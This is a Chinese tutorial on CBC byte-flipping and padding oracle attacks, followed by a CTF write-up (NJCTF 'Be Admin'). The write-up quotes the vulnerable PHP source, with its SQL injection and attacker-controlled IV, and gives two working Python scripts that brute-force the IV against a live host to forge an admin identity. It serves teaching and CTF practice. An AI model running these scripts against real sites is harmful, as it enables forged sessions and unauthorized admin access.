@@ -1,0 +1,401 @@
+# CBC字节翻转攻击解析
+
+前言：之前一直没弄懂，最近了解了一些密码学才勉强能学习。惭愧惭愧~~~~
+
+## 一、分组密码的模式
+
+分组密码的主要模式有5种：
+
+  1. ECB模式（电子密码本模式）—（Electronic CodeBook mode）
+
+  2. CBC模式（密码分组链接模式）—（Cipher Block Chaining mode）
+
+  3. CFB模式（密文反馈模式）—（Cipher FeedBack mode）
+
+  4. OFB模式（输出反馈模式）—（Output FeedBack mode）
+
+  5. CTR模式（计数器模式）—（CounteR mode）
+
+这里只详细介绍CBC密码分组链接模式：通过下图简要介绍
+
+![image-20200808220903785](https://image.3001.net/images/20200808/1596900337.png!small)
+
+首先，我们给定一组明文，我们按照AES或者DES加密标准，将数据分成几块，每一块的大小可以是16字节，32字节等（将文明分为上面图示的明文分组）
+
+然后我们给定一个长度和分组相同的初始化向量（IV），与每一块明文分组进行异或操作，将得到的数据通过密钥加密，得到密文分组。得到的当前一块的密文分组作为下一个块加密的初始化向量。（如图所示）
+
+## 二、CBC字节翻转攻击
+
+该攻击，可以使我们在已知密文的情况下，控制明文为我们想要的数据。（后面介绍的padding oracle attack不仅可以控制明文，还可以获取明文数据）
+
+![image-20200808220903785](https://image.3001.net/images/20200808/1596900337.png!small)
+
+还是通过上面的图来介绍，这里探究一下解密的过程：（从后往前）
+
+例如，通过正常的解密，我们要得到明文分组4，应该怎么做：
+
+**将密文分组4解密后与密文分组3异或，便得到明文分组4**
+
+（这里稍微介绍一下异或的性质，例如A异或B得到C，那么C异或B也会得到A）
+
+因为我们一般情况下，都会知道密文。我们可以任意修改密文分组3，当他与密文分组4解密后的那一部分异或后，那么得到的明文分组就与之前的不同。
+
+（我们可以尽量尝试构造密文分组的每一位------因为我们知道异或是位的运算）
+
+到这里，我们就可以伪造明文分组4为我们想要构成的数据（尽管我们不知道密文分组4的解密密钥是什么，但我们仍然可以任意构造明文分组4）
+
+同理，明文分组3、明文分组2我们都可以通过前一个密文分组来自定义构造我们想要的值（至于第一部分，如果我们知道最初的初始化向量IV，那么也是可以构造的）
+
+## 三、Padding Oracle Attack攻击
+
+首先介绍一下数据块的填充规则，常见的有PKCS #5和PKCS #7分别填充的是8字节分组和16字节分组。
+
+例如我们采用PKCS #7的填充方式，给定一串明文"m1sn0w"，长度为6，因为PKCS
+#7填充的是16字节组分，所有需要填充10个字节，让填充的字节是16的整数倍。那么填充的字符是什么？答案是0x0a（16进制表示的10）
+
+以此类推：
+
+    
+    
+    如果明文长度为15，我们需要填充一个字节0x01  
+    如果明文长度为14，我们需要填充两个个字节0x02  
+    ​  
+    这里特别需要注意的是：如果明文长度为16的整数字节长，它也需要填充  
+    它会一次填充16位，且填充的字符为0x10
+
+下面介绍一下关于Padding Oracle Attack攻击的一些条件。
+
+首先需要介绍的是一般对于CBC模式的解密，有几种判断情况：
+
+    
+    
+    1、正常解密，得到明文  
+    ​  
+    2、解密成功，但是解密得到的和明文不匹配  
+    ​  
+    3、解密错误，抛出异常
+
+这里要特别提一下解密错误：当我们第一串密文进行CBC模式的解密的时候，解密完成以后，程序会通过最后解密出来的明文的填充符来判断是否解密成功。
+
+例如：
+
+如果解密出来的明文最后的1位填充符为0x01，那么程序判定解密成功
+
+相反，如果解密出来只有最后一位为0x02，那么程序会判断解密错误（因为我们知道，如果填充符为0x02，那么应该是最后两位为0x02）
+
+在Web应用程序中，我们通常会有三种逻辑判断。（例如加密数据用于cookie）
+
+    
+    
+    1、如果cookie正常解密，且明文匹配，那么我们可以直接进入网页  
+    ​  
+    2、cookie正常解密，但是解密出来的明文不符合，仍然不可以登录  
+    ​  
+    3、cookie解密错误，抛出500错误
+
+如果网页存在以上情况，就可能存在padding oracle attack攻击，那么该攻击如何实现？
+
+这里利用的还是上面介绍到的CBC翻转攻击，还是用该图示来介绍：
+
+![image-20200808220903785](https://image.3001.net/images/20200808/1596900337.png!small)
+
+我们知道，构造密文分组3，可以任意构造出明文分组4的值。
+
+通过上面的三种逻辑判断，如果我们构造密文分组3的最后一位，通过试探穷举，明文分组4的最后一位总会得到0x01的。
+
+假设我们处在上方的Web应用程序环境中，只有正确构造出密文分组3的最后一位，使明文分组4的最后一位为0x01，那么程序才不会返回500的错误。
+
+然后我们将密文分组3的最后一位与0x01异或，便得到密文分组4解密后的最后一位的值（通过异或的性质得到）
+
+如此循环：
+
+通过第一步，我们得到最后一位的中间值，然后我们构造密文分组3的倒数第二个和倒数第一个（倒数第一个就比较好构造，因为我们已经知道了中间值），使明文分组4的最后两个为0x02，从而我们就可以得到倒数第二位的中间值（依次重复，构造0x03,0x04，最终我们将得到所有密文分组通过解密后的这一串中间值）
+
+那么想要得到明文数据就很简单了，因为我们已经知道了中间值，又知道了密文，只需要进行相应的异或，便可以得到明文数值。
+
+## 四、NJCTF Web Be Admin
+
+该题是一个padding oracle attack攻击的比较典型的一个例子。
+
+（复现的源代码在github上直接就可以搜到）
+
+拿到改题目，通过文件备份，拿到源码：
+
+    
+    
+    <?php  
+    include 'config.php';  
+    error_reporting(0);  
+    define("SECRET_KEY", "this_is_key_you_do_not_know");  
+    define("METHOD", "aes-128-cbc");  
+    ​  
+    session_start();  
+    ​  
+    function get_random_token(){  
+        $random_token='';  
+        for($i=0;$i<16;$i++){  
+            $random_token.=chr(rand(1,255));  
+        }  
+        return $random_token;  
+    }  
+    ​  
+    function get_identity()  
+    {  
+        global $defaultId;  
+        $j = $defaultId;  
+        $token = get_random_token();  
+        $c = openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);  
+        $_SESSION['id'] = base64_encode($c);  
+        setcookie("ID", base64_encode($c));  
+        setcookie("token", base64_encode($token));  
+        if ($j === 'admin') {  
+            $_SESSION['isadmin'] = true;  
+        } else $_SESSION['isadmin'] = false;  
+    ​  
+    }  
+    ​  
+    function test_identity()  
+    {  
+        if (!isset($_COOKIE["token"]))  
+            return array();  
+        if (isset($_SESSION['id'])) {  
+            $c = base64_decode($_SESSION['id']);  
+            if ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE["token"]))) {  
+                if ($u === 'admin') {  
+                    $_SESSION['isadmin'] = true;  
+                } else $_SESSION['isadmin'] = false;  
+            } else {  
+                die("ERROR!");  
+            }  
+        }  
+    }  
+    ​  
+    function login($encrypted_pass, $pass)  
+    {  
+        $encrypted_pass = base64_decode($encrypted_pass);  
+        $iv = substr($encrypted_pass, 0, 16);  
+        $cipher = substr($encrypted_pass, 16);  
+        $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);  
+          
+        return $password == $pass;  
+    }  
+    ​  
+    ​  
+    ​  
+    function need_login($message = NULL) {  
+        echo "   <!doctype html>  
+            <html>  
+            <head>  
+            <meta charset=\"UTF-8\">  
+            <title>Login</title>  
+            <link rel=\"stylesheet\" href=\"CSS/target.css\">  
+                <script src=\"https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\"></script>  
+            </head>  
+            <body>";  
+        if (isset($message)) {  
+            echo "  <div>" . $message . "</div>\n";  
+        }  
+        echo "<form method=\"POST\" action=''>  
+                <div class=\"body\"></div>  
+                    <div class=\"grad\"></div>  
+                        <div class=\"header\">  
+                            <div>Log<span>In</span></div>  
+                        </div>  
+                        <br>  
+                        <div class=\"login\">  
+                            <input type=\"text\" placeholder=\"username\" name=\"username\">  
+                            <input type=\"password\" placeholder=\"password\" name=\"password\">                 
+                            <input type=\"submit\" value=\"Login\">  
+                        </div>  
+                         <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>  
+                </form>  
+            </body>  
+        </html>";  
+    }  
+    ​  
+    function show_homepage() {  
+        echo "<!doctype html>  
+    <html>  
+    <head><title>Login</title></head>  
+    <body>";  
+        global $flag;  
+        printf("Hello ~~~ ctfer! ");  
+        if ($_SESSION["isadmin"])  
+            echo $flag;  
+        echo "<div><a href=\"logout.php\">Log out</a></div>  
+    </body>  
+    </html>";  
+    ​  
+    }  
+    ​  
+    if (isset($_POST['username']) && isset($_POST['password'])) {  
+        $username = (string)$_POST['username'];  
+        $password = (string)$_POST['password'];  
+        $query = "SELECT username, encrypted_pass from users WHERE username='$username'";  
+        $res = $conn->query($query) or trigger_error($conn->error . "[$query]");  
+        if ($row = $res->fetch_assoc()) {  
+            $uname = $row['username'];  
+            $encrypted_pass = $row["encrypted_pass"];  
+        }  
+          
+        if ($row && login($encrypted_pass, $password)) {  
+            echo "you are in!" . "</br>";  
+            get_identity();  
+            show_homepage();  
+        } else {  
+            echo "<script>alert('login failed!');</script>";  
+            need_login("Login Failed!");  
+        }  
+    ​  
+    } else {  
+        test_identity();  
+        if (isset($_SESSION["id"])) {  
+            show_homepage();  
+        } else {  
+            need_login();  
+        }  
+    }
+
+简单审计之后，大致的利用过程如下：
+
+    
+    
+    1、通过sql的union注入，登录进去，获取到SESSION['id']的值  
+    ​  
+        登录过后，会返回cookie的token值  
+    ​  
+    2、然后我们通过test_identity函数，进行padding oracle attack攻击
+
+这里主要介绍一下test_identity函数：
+
+    
+    
+    function test_identity()  
+    {  
+        if (!isset($_COOKIE["token"]))  
+            return array();  
+        if (isset($_SESSION['id'])) {  
+            $c = base64_decode($_SESSION['id']);  
+            if ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE["token"]))) {  
+                if ($u === 'admin') {  
+                    $_SESSION['isadmin'] = true;  
+                } else $_SESSION['isadmin'] = false;  
+            } else {  
+                die("ERROR!");  
+            }  
+        }  
+    }
+
+其中，实施攻击的部分主要是在这里：
+
+    
+    
+    if ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE["token"])))
+
+我们不知道SECRET_KEY，也就是密钥，也不知道$c明文，但是，我们可以控制$_COOKIE["token"]，并且他在这里作为了初始化向量IV
+
+（该题目正好符合我们所假设的Web环境，如果解密出错，die("ERROR")）
+
+那么我们就可以通过不断的构造$_COOKIE['token']的值，最终伪造出一个明文，其值为admin0x0b0x0b0x0b0x0b0x0b0x0b0x0b0x0b0x0b0x0b0x0b
+
+下面给出一个自己写的脚本：
+
+    
+    
+    import base64  
+    import requests  
+    from binascii import a2b_hex  
+    import urllib  
+    ​  
+    def deal_hex(index):  
+        tmp = hex(index)  
+        if index > 15:  
+            return a2b_hex(tmp[2:])  
+        else:  
+            return a2b_hex('0'+tmp[2:])  
+    ​  
+    def padding(token,pad):  
+        tmp_token = token  
+        if len(middle_value) != 0:  
+            for index in middle_value:  
+                tmp_token += deal_hex(index ^ pad)  
+        return tmp_token  
+    ​  
+    ​  
+    url = "http://121.41.113.245:8085/"  
+    token = "A0KKqNuqv5jpnfe62FGFpw%3D%3D"  
+    urldeal = urllib.parse.unquote(token)  
+    tokens = base64.b64decode(urldeal)  
+    ​  
+    middle_value = []  
+    for j in range(16):  
+        change = j + 1  
+        tmp_index = 16-j-1  
+        tmp_token = tokens[0:tmp_index]  
+        for i in range(0, 255):  
+            ch = deal_hex(i)  
+            # print(len(tokens[0:15] + ch))  
+            newtoken = padding(tmp_token+ch,change)  
+            newtoken = urllib.parse.quote(str(base64.b64encode(newtoken),encoding='utf-8'))  
+            #print(newtoken)  
+            # print(newtoken)  
+            header = {  
+                "Cookie": "PHPSESSID=fhgkecm8p2dr0meg854g728706;ID=riMd%2FSaFOw%2BDBDOkLkGukw%3D%3D;token=" + newtoken  
+            }  
+            r = requests.post(url, headers=header)  
+            if "ERR" not in r.text:  
+                middle_value.insert(0,change ^ i)  
+                print(middle_value)  
+                break  
+    ​
+
+该脚本获取中间值（也就是密文解密的那一部分值）---（此脚本存在一点点缺陷，不能获取第一位的中间值，所以使用下面的脚本直接对第一个值进行爆破）
+
+    
+    
+    import requests  
+    import base64  
+    from binascii import a2b_hex  
+    import urllib  
+    ​  
+    def deal_hex(index):  
+        tmp = hex(index)  
+        if index > 15:  
+            return a2b_hex(tmp[2:])  
+        else:  
+            return a2b_hex('0'+tmp[2:])  
+    url = "http://121.41.113.245:8085/"  
+    inin_iv = [0, 83, 130, 178, 193, 170, 191, 152, 233, 157, 247, 186, 216, 81, 133, 173]  
+    for i in range(0,255):  
+        inin_iv[0] = i  
+        token = b''  
+        for i in inin_iv:  
+            token += deal_hex(i)  
+        newtoken = urllib.parse.quote(str(base64.b64encode(token),encoding='utf-8'))  
+        header = {  
+            "Cookie": "PHPSESSID=fhgkecm8p2dr0meg854g728706;ID=riMd%2FSaFOw%2BDBDOkLkGukw%3D%3D;token=" + newtoken  
+        }  
+        r = requests.post(url, headers=header)  
+        if "{" in r.text:  
+            print(r.text)  
+    ​  
+    ​
+
+其中的inin_iv是第一个脚本获取的值与要构造的明文的异或的值。
+
+最终得到flag
+
+    
+    
+    <!doctype html>  
+    <html>  
+    <head><title>Login</title></head>  
+    <body>Hello ~~~ ctfer! CTFTraining{CoColi_has_to_work_hard}<div><a href="logout.php">Log out</a></div>  
+    </body>  
+    </html>
+
+参考链接：
+
+>
+> [https://www.freebuf.com/articles/database/151167.html](articles/database/151167.html)
+
